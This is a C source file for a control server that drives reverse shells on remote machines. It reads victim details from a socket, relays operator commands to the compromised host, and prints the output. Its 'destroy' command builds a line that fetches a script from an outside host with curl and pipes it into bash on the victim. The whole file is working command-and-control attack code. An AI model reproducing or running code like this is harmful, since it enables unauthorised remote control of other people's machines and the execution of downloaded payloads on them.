#include "control_server.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

//socket stuff
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

//signal stuff
#include <signal.h>

//reap children
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "utils.h"
#include "networking.h"
#include "server.h"
#include "init_struct.h"
#include <signal.h>

#define MESSAGE_LENGTH 2048
#define INFO "childinfo"
#define DESTROY_CMD_OPEN "echo \"VIRUS="
#define DESTROY_CMD_CLOSE " `curl -X POST https://cyber.stanleyhoo1.tech/files/cleanup.sh`\" | bash"

struct init_struct init;

char * special_cmd(char * cmd){
  if(strcmp(cmd, "destroy")==0){

    strcpy(cmd, DESTROY_CMD_OPEN);
    strcat(cmd, init.curr_directory);
    strcat(cmd, DESTROY_CMD_CLOSE);
  }

  return cmd;
}

int listening_server_action(int new_socket, int readPipe){

  read(new_socket, &init, sizeof(struct  init_struct));
  print_init_struct(&init);


  int fds[2];
  pipe(fds);

  int forkResult = fork();

  // If cmld, read from listening server and write to socket
  if (forkResult == 0){
    server_name = CONTROL_SERVER_WRITE;
    while (1){
      //read the cmd from the user_shell pipe
      char message[MESSAGE_LENGTH] = "";
      int readResult = read(readPipe, message, MESSAGE_LENGTH-1);

      //check if it is the info cmd
      if(strcmp(message, INFO)==0){
        print_init_struct(&init);
      }
      else{

        strcpy(message, special_cmd(message));

        // prime the message to trigger the reverse shell by appending a new line
        strcat(message, "\n");

        //calculate message_size
        int msg_size = (strlen(message)+1) * sizeof(char);

        //write to the reverse shell
        int write_result=write(new_socket, message, msg_size);
      }
    }
  }
  // If parent, just read from socket
  else {
    server_name = CONTROL_SERVER_READ;

    char connection[MESSAGE_LENGTH] = "";
    int bytes;
    while(bytes = read(new_socket, connection, MESSAGE_LENGTH)){
      printf("%s",connection);
      fflush(stdout);
      memset(connection, 0, sizeof(connection));
    }
    kill(forkResult, 9);
  }
  return 0;
}
